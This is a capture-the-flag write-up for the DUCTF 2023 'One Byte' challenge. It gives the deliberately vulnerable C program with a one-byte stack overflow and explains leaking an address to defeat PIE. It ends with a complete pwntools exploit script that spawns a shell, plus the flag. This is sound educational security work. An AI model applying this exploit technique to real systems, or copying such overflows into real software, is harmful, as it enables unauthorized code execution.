---
title: Writeup - One Byte (DUCTF 2023)
date: 2023-09-04 00:00:00
tags: 
- writeup
- pwn
- ductf2023
---

# DUCTF 2023 - One Byte
## Description
```markdown
Here's a one byte buffer overflow!

Author: joseph

`nc 2023.ductf.dev 30018`

[onebyte] [onebyte.c]
```

## Writeup
Here's the [source code](/static/ductf-onebyte/onebyte.c) (and [binary](/static/ductf-onebyte/onebyte)):

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

void init() {
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stdin, 0, 2, 0);
}

void win() {
    system("/bin/sh");
}

int main() {
    init();

    printf("Free junk: 0x%lx\n", init);
    printf("Your turn: ");

    char buf[0x10];
    read(0, buf, 0x11);
}
```

The provided executable is a 32-bit dynamically-linked executable, with the following security measures:

```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
```

Finding the bug and determining how to get the flag is fairly easy. There's a `win()` function present which will give a shell when called. There is a 1 byte overflow in the `main()` function. PIE is enabled, meaning we need an info leak to return to the `win()` function, but the leak is given freely as "free junk" upon startup. 

Using pwntools, the address of `win()` was calculated from the `init()` leak using the following code:

```python
# get WIN leak
init = int(p.recvline().split(b' ')[-1].strip().decode(),16)
print("init: ", hex(init))

win = init + (0x11203 - 0x111bd)
print("win: ", hex(win))
```

### Stack Overflow
The hard part was figuring out how to use the one-byte overflow to control the `$eip` register. Inspecting the program while running using GDB revealed that the one byte overflow overwrote the least significant byte of a stack address during a function `ret`, meaning we have limited control over the stack pointer. Using that, we can shift what the stack looks like so when the `$eip` register looks on the stack for the function return address, it points to an address that we specify. 

The main drawback is that the stack addresses are randomized each time the program runs, meaning you don't know where exactly your input on the stack is stored. To remediate it, you put the address on the stack as many times as possible, then overwrite the last byte with a random byte that ensures the values are aligned properly, and then you run the exploit many times until it finally meets the right requirements. 

### Solve Script
[Solve script](/static/ductf-onebyte/solve.py):

```python
from pwn import *


# initialize the binary
binary = "./onebyte"
elf = context.binary = ELF(binary, checksec=False)

gs = """
layout asm
layout reg
break main
break read
continue
"""



if args.REMOTE:
    p = remote("2023.ductf.dev", 30018)
elif args.GDB:
    p = gdb.debug(binary, gdbscript=gs)
else:
    p = elf.process()


# get WIN leak
init = int(p.recvline().split(b' ')[-1].strip().decode(),16)
print("init: ", hex(init))

win = init + (0x11203 - 0x111bd)
print("win: ", hex(win))


# exploit
payload = p32(win) + p32(win) + p32(win) + p32(win) + b'\x78'

p.sendline(payload)

p.interactive()
```

<img src="/static/ductf-onebyte/onebyte_solve.png" width="600px">

**Flag**: `DUCTF{all_1t_t4k3s_is_0n3!}`